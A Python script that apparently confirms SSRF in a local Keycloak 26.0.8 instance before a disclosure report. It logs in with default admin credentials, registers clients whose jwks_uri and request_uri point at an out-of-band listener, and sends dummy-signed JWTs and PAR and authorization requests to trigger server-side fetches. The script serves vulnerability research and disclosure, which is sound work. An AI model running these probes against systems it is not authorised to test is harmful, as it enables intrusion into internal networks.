#!/usr/bin/env python3
"""
ssrf_tests.py — SSRF confirmation tests against Keycloak 26.0.8
Standard-library only (no third-party packages required).

Test 1 — jwks_uri SSRF
  Setup : Register a confidential OIDC client whose 'jwks_uri' points at our
          listener (http://host.docker.internal:9001/jwks).
  Probe : POST /token with a client_assertion JWT (RS256 header, dummy sig).
          Keycloak must fetch the JWKS to verify the assertion key.
  SSRF  : Confirmed if Keycloak's JVM connects to our listener.

Test 2 — request_uri SSRF
  2a PAR endpoint:
      POST /ext/par/request  (client auth required — uses Test-1 client)
      Body includes: request_uri=http://host.docker.internal:9001/jar-probe
      Keycloak may fetch the URI to retrieve a JAR (RFC 9101).
  2b Authorization endpoint (no client auth required):
      GET  /auth?client_id=...&request_uri=http://host.docker.internal:9001/jar-probe
      Some IdPs resolve request_uri before enforcing auth.
  SSRF  : Confirmed if either probe reaches our listener.
"""

import base64
import json
import os
import socket
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# ── Config ────────────────────────────────────────────────────────────────────
KC_BASE     = "http://localhost:8080"
REALM       = "master"
LISTEN_PORT = 9001
OOB_HOST    = "host.docker.internal"   # resolves to 192.168.65.254 in this env
ADMIN_USER  = "admin"
ADMIN_PASS  = "admin"
TOKEN_EP    = f"{KC_BASE}/realms/{REALM}/protocol/openid-connect/token"
PAR_EP      = f"{KC_BASE}/realms/{REALM}/protocol/openid-connect/ext/par/request"
AUTH_EP     = f"{KC_BASE}/realms/{REALM}/protocol/openid-connect/auth"
JWKS_URI    = f"http://{OOB_HOST}:{LISTEN_PORT}/jwks"
JAR_URI     = f"http://{OOB_HOST}:{LISTEN_PORT}/jar-probe"

# ── HTTP listener (raw socket, records every inbound request) ─────────────────

_hits: list[dict] = []
_listener_ready = threading.Event()
_listener_stop  = threading.Event()


def _listener_thread():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", LISTEN_PORT))
    except OSError as e:
        _hits.append({"error": f"bind failed: {e}"})
        _listener_ready.set()
        return
    srv.listen(10)
    srv.settimeout(1.0)
    _listener_ready.set()
    while not _listener_stop.is_set():
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        raw = b""
        conn.settimeout(2.0)
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                raw += chunk
                if b"\r\n\r\n" in raw:
                    break
        except socket.timeout:
            pass
        decoded = raw.decode("utf-8", errors="replace")
        lines   = decoded.split("\r\n")
        request_line = lines[0] if lines else ""
        headers = {k: v for k, v in (
            (p[0].strip().lower(), p[1].strip())
            for ln in lines[1:]
            if ":" in ln
            for p in [ln.split(":", 1)]
        )}
        path = request_line.split(" ")[1] if " " in request_line else "/"
        # Serve appropriate content per path
        if "/jwks" in path:
            body = b'{"keys":[]}'
            ct   = b"application/json"
        else:
            body = b"OK"
            ct   = b"text/plain"
        conn.sendall(
            b"HTTP/1.1 200 OK\r\nContent-Type: " + ct +
            b"\r\nContent-Length: " + str(len(body)).encode() +
            b"\r\nConnection: close\r\n\r\n" + body
        )
        conn.close()
        _hits.append({
            "from":         addr,
            "request_line": request_line,
            "path":         path,
            "headers":      headers,
            "ts":           time.strftime("%H:%M:%S"),
        })
    srv.close()


def _start_listener():
    t = threading.Thread(target=_listener_thread, daemon=True)
    t.start()
    ok = _listener_ready.wait(timeout=5)
    if not ok or (len(_hits) == 1 and "error" in _hits[0]):
        raise RuntimeError(_hits[0].get("error", "listener did not start"))
    return t


def _stop_listener(t):
    _listener_stop.set()
    t.join(timeout=3)


def _hits_since(n: int) -> list[dict]:
    return [h for h in _hits[n:] if "error" not in h]


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _post_form(url: str, fields: dict, bearer: str | None = None):
    body = urllib.parse.urlencode(fields).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if bearer:
        headers["Authorization"] = f"Bearer {bearer}"
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    t0  = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            return r.status, json.loads(r.read()), round((time.monotonic()-t0)*1000)
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read()), round((time.monotonic()-t0)*1000)
    except Exception as ex:
        return None, {"error": str(ex)}, round((time.monotonic()-t0)*1000)


def _post_json(url: str, payload: dict, bearer: str):
    body = json.dumps(payload).encode()
    req  = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/json",
                 "Authorization": f"Bearer {bearer}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())
    except Exception as ex:
        return None, {"error": str(ex)}


def _get(url: str):
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, r.read(2048).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(2048).decode(errors="replace")
    except Exception as ex:
        return None, str(ex)


def _delete(url: str, bearer: str):
    req = urllib.request.Request(
        url, headers={"Authorization": f"Bearer {bearer}"}, method="DELETE"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None


# ── JWT factory (RS256 header/claims, dummy 256-byte signature) ───────────────

def _b64url(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _make_client_assertion(client_id: str, audience: str) -> str:
    """
    Syntactically valid RS256 JWT with a dummy signature.

    Keycloak must fetch the JWKS to obtain the public key before it can
    verify the signature, so the SSRF callback occurs regardless of whether
    the signature bytes are cryptographically valid.
    """
    header = {"alg": "RS256", "kid": "ssrf-test-key-1", "typ": "JWT"}
    now    = int(time.time())
    claims = {
        "iss": client_id,
        "sub": client_id,
        "aud": audience,
        "exp": now + 300,
        "iat": now,
        "jti": os.urandom(8).hex(),
    }
    h   = _b64url(json.dumps(header, separators=(",", ":")))
    p   = _b64url(json.dumps(claims, separators=(",", ":")))
    sig = _b64url(bytes(256))   # 256 zero bytes — invalid but structurally valid
    return f"{h}.{p}.{sig}"


# ── Admin helpers ─────────────────────────────────────────────────────────────

def _admin_token() -> str:
    code, resp, _ = _post_form(TOKEN_EP, {
        "grant_type": "password",
        "client_id":  "admin-cli",
        "username":   ADMIN_USER,
        "password":   ADMIN_PASS,
    })
    if "access_token" not in resp:
        raise RuntimeError(f"Admin auth failed (HTTP {code}): {resp}")
    return resp["access_token"]


def _create_client(payload: dict, token: str) -> str:
    """Creates a client and returns its UUID."""
    code, resp = _post_json(
        f"{KC_BASE}/admin/realms/{REALM}/clients", payload, token
    )
    if code not in (200, 201):
        raise RuntimeError(f"Client creation failed (HTTP {code}): {resp}")
    # Fetch UUID
    req = urllib.request.Request(
        f"{KC_BASE}/admin/realms/{REALM}/clients"
        f"?clientId={urllib.parse.quote(payload['clientId'])}",
        headers={"Authorization": f"Bearer {token}"},
    )
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())[0]["id"]


def _cleanup(client_uuid: str, token: str):
    sc = _delete(
        f"{KC_BASE}/admin/realms/{REALM}/clients/{client_uuid}", token
    )
    print(f"  [cleanup] DELETE client/{client_uuid[:8]}… → HTTP {sc}")


# ── Result printer ────────────────────────────────────────────────────────────

SEP = "=" * 72

def _report_hit(label: str, hit: dict):
    print(f"\n  *** SSRF CONFIRMED — {label} ***")
    print(f"  Callback from : {hit['from']}")
    print(f"  Request line  : {hit['request_line']}")
    print(f"  Path          : {hit['path']}")
    print(f"  Time          : {hit['ts']}")
    if hit["headers"]:
        print("  Request headers sent by Keycloak:")
        for k, v in hit["headers"].items():
            print(f"    {k}: {v}")


def _report_no_hit(probe_name: str, http_code, resp_excerpt: str):
    print(f"\n  No callback for {probe_name} within wait window.")
    print(f"  Keycloak response: HTTP {http_code}  {resp_excerpt[:160]}")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 1 — jwks_uri SSRF
# ═══════════════════════════════════════════════════════════════════════════════

def test_jwks_ssrf(admin_token: str, listener_t) -> bool:
    client_id = f"ssrf-jwks-{int(time.time())}"
    uuid      = None
    print(f"\n{SEP}")
    print(f"  TEST 1 — jwks_uri SSRF")
    print(f"  Client ID  : {client_id}")
    print(f"  jwks_uri   : {JWKS_URI}")
    print(SEP)

    # Register confidential client with jwks_uri
    print(f"  [1/3] Registering client with jwks_uri → listener…")
    try:
        uuid = _create_client({
            "clientId":              client_id,
            "enabled":               True,
            "protocol":              "openid-connect",
            "publicClient":          False,
            "serviceAccountsEnabled":True,
            "clientAuthenticatorType":"client-jwt",
            "attributes": {
                "jwks.url":      JWKS_URI,
                "use.jwks.url":  "true",
            },
        }, admin_token)
        print(f"  [+] Client created  UUID={uuid[:8]}…")
    except RuntimeError as e:
        print(f"  [!] {e}")
        return False

    # Trigger
    before = len(_hits_since(0))
    print(f"  [2/3] Sending client_assertion JWT to /token…")
    assertion = _make_client_assertion(client_id, TOKEN_EP)
    code, resp, ms = _post_form(TOKEN_EP, {
        "grant_type":             "client_credentials",
        "client_assertion_type":  "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion":       assertion,
    })
    print(f"  [*] /token response: HTTP {code}  ({ms}ms)  {str(resp)[:100]}")

    # Wait for callback
    print(f"  [3/3] Waiting 3s for JWKS fetch callback…")
    time.sleep(3)
    new_hits = _hits_since(before)

    # Report
    confirmed = False
    if new_hits:
        for h in new_hits:
            _report_hit("jwks_uri", h)
        confirmed = True
    else:
        _report_no_hit("jwks_uri", code, str(resp))

    _cleanup(uuid, admin_token)
    print(f"\n  RESULT: {'HIT — SSRF CONFIRMED' if confirmed else 'NO HIT'}")
    return confirmed


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 2 — request_uri SSRF
# ═══════════════════════════════════════════════════════════════════════════════

def test_request_uri_ssrf(admin_token: str, listener_t) -> bool:
    client_id = f"ssrf-par-{int(time.time())}"
    uuid      = None
    confirmed = False
    print(f"\n{SEP}")
    print(f"  TEST 2 — request_uri SSRF  (PAR + authorization endpoint)")
    print(f"  Probe URL  : {JAR_URI}")
    print(SEP)

    # Create a public client for PAR auth (public clients only need client_id)
    print(f"  [setup] Registering public OIDC client '{client_id}'…")
    try:
        uuid = _create_client({
            "clientId":              client_id,
            "enabled":               True,
            "protocol":              "openid-connect",
            "publicClient":          True,
            "standardFlowEnabled":   True,
            "redirectUris":          ["http://localhost/*"],
            "attributes": {
                "request.uris": "http://host.docker.internal:9001/*",
                "request.object.required": "false",
            },
        }, admin_token)
        print(f"  [+] Client created  UUID={uuid[:8]}…")
    except RuntimeError as e:
        print(f"  [!] {e}")
        # Fall through — test 2b may still work without a client

    # ── 2a: PAR endpoint ─────────────────────────────────────────────────────
    print(f"\n  --- 2a: PAR endpoint ---")
    print(f"  POST {PAR_EP}")
    print(f"  Body: client_id={client_id}&request_uri={JAR_URI}")
    before = len(_hits_since(0))
    code, resp, ms = _post_form(PAR_EP, {
        "client_id":     client_id,
        "response_type": "code",
        "scope":         "openid",
        "redirect_uri":  "http://localhost/cb",
        "request_uri":   JAR_URI,
    })
    print(f"  [*] PAR response: HTTP {code}  ({ms}ms)  {str(resp)[:120]}")
    time.sleep(3)
    par_hits = _hits_since(before)
    if par_hits:
        for h in par_hits:
            _report_hit("PAR request_uri", h)
        confirmed = True
    else:
        _report_no_hit("PAR endpoint request_uri", code, str(resp))

    # ── 2b: authorization endpoint with request_uri ───────────────────────────
    print(f"\n  --- 2b: authorization endpoint (GET /auth?request_uri=…) ---")
    auth_url = (
        f"{AUTH_EP}?client_id={urllib.parse.quote(client_id)}"
        f"&response_type=code&scope=openid"
        f"&redirect_uri={urllib.parse.quote('http://localhost/cb')}"
        f"&request_uri={urllib.parse.quote(JAR_URI)}"
    )
    print(f"  GET {auth_url}")
    before = len(_hits_since(0))
    code, body = _get(auth_url)
    print(f"  [*] /auth response: HTTP {code}  {body[:120]}")
    time.sleep(3)
    auth_hits = _hits_since(before)
    if auth_hits:
        for h in auth_hits:
            _report_hit("/auth request_uri", h)
        confirmed = True
    else:
        _report_no_hit("/auth request_uri", code, body)

    if uuid:
        _cleanup(uuid, admin_token)

    print(f"\n  RESULT: {'HIT — SSRF CONFIRMED' if confirmed else 'NO HIT'}")
    return confirmed


# ═══════════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print(SEP)
    print("  Keycloak SSRF Confirmation Tests")
    print(f"  Target   : {KC_BASE}/realms/{REALM}")
    print(f"  Listener : 0.0.0.0:{LISTEN_PORT}  (OOB host: {OOB_HOST})")
    print(SEP)

    # Pre-check: can Keycloak's container reach our listener?
    print("\n[pre-check] Verifying host.docker.internal resolves in container…")
    import subprocess
    r = subprocess.run(
        ["docker", "exec", "keycloak-dev", "sh", "-c",
         f"getent hosts {OOB_HOST}"],
        capture_output=True, text=True
    )
    if r.stdout.strip():
        print(f"  [+] {OOB_HOST} → {r.stdout.strip()}")
    else:
        print(f"  [!] {OOB_HOST} did not resolve in container: {r.stderr.strip()}")
        print("  [!] OOB callbacks will not reach this listener.")

    # Start listener
    print(f"\n[*] Starting HTTP listener on :{LISTEN_PORT}…")
    try:
        listener = _start_listener()
    except RuntimeError as e:
        print(f"[!] Cannot start listener: {e}")
        return
    print(f"  [+] Listener ready.")

    # Admin token
    print("\n[*] Obtaining admin token (admin/admin via admin-cli)…")
    try:
        token = _admin_token()
        print("  [+] Admin token obtained.")
    except RuntimeError as e:
        print(f"  [!] {e}")
        _stop_listener(listener)
        return

    # Run tests
    r1 = test_jwks_ssrf(token, listener)
    r2 = test_request_uri_ssrf(token, listener)

    # Summary
    _stop_listener(listener)
    print(f"\n{SEP}")
    print("  SUMMARY")
    print(SEP)
    print(f"  Test 1 — jwks_uri SSRF       : {'CONFIRMED (new finding)' if r1 else 'NOT exploitable'}")
    print(f"  Test 2 — request_uri SSRF    : {'CONFIRMED (new finding)' if r2 else 'NOT exploitable'}")
    print()
    if r1 or r2:
        print("  Decision: ADD SSRF finding(s) to disclosure before sending.")
    else:
        print("  Decision: No SSRF found. Send three-finding disclosure report.")
    print(SEP)
    print(f"\n  Total callbacks received : {len([h for h in _hits if 'error' not in h])}")
    for i, h in enumerate(h for h in _hits if "error" not in h):
        print(f"    [{i+1}] {h['request_line']}  from {h['from']}  at {h['ts']}")


if __name__ == "__main__":
    main()
